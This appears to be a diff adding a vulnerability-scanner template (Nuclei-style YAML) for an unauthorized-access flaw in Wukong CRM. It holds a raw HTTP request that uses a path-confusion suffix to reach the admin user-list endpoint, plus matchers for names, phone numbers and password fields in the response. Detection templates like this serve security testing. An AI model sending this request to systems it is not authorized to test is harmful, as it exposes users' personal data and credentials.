@@ -1,0 +1,30 @@
+id: wukong-queryUserList-info
+
+info:
+  name: 悟空CRM queryUserList 存在未授权访问漏洞
+  author: wukong
+  severity: high
+  tags: wukong
+
+http:
+  - raw:
+      - |
+        POST /adminUser/queryUserList///;name=/v2/api-docs HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Content-Type: application/json
+
+        {
+            "page": 1,
+            "limit": 5
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"realname"'
+          - '"mobile"'
+          - '"password"'
+        condition: and
